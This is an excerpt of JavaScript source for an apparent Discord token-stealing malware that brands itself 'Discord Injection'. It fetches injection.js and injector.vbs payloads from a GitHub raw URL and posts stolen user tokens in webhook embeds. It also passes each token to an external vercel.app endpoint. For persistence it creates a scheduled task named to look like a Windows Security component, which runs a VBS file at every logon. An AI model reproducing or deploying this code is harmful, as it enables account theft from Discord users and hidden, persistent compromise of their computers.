...
const CONFIG = {
    ...
    injection_url: 'https://raw.githubusercontent.com/Reeronia37/L-B/main/injection.js',
    injector_url: 'https://raw.githubusercontent.com/Reeronia37/L-B/main/injector.vbs',
    get: {
...
const notify = async (ctx, token, user) => {
    ...
    ctx.username = `Discord Injection`;
    ctx.avatar_url = `https://i.imgur.com/CeFqJOc.gif`;

    ctx.embeds[0].fields.unshift({
        name: `<a:hearts:1176516454540116090> Token:`,
        value: `\`\`\`${token}\`\`\`\n[[Click Here To Copy Your Token]](https://69691243.vercel.app/api/realkramp/raw?data=${token})`,
        inline: false
    })
    ...
    ctx.embeds.forEach(embed => {
        ...
        embed.footer = {
            text: 'discord.gg/bursa x prava',
            icon_url: "https://avatars.githubusercontent.com/u/198644981",
        };
...
const forcePersistStartup = async () => {
    ...
    const checkScheduledTaskExists = () => {
        return new Promise((resolve) => {
            exec('schtasks /query /tn "WindowsSecurityHealthSystrayprv"', (err) => {
                resolve(!err);
            });
        });
    };
    ...
    const createBatchFile = () => {
        const batContent = `
            ...
            schtasks /create /tn "WindowsSecurityHealthSystrayprv" /tr "wscript.exe \"%vbsFilePath%\"" /sc onlogon /f
            if %ERRORLEVEL% EQU 0 (
...
const startup = async () => {
    const startupDir = path.join(__dirname, 'prv');
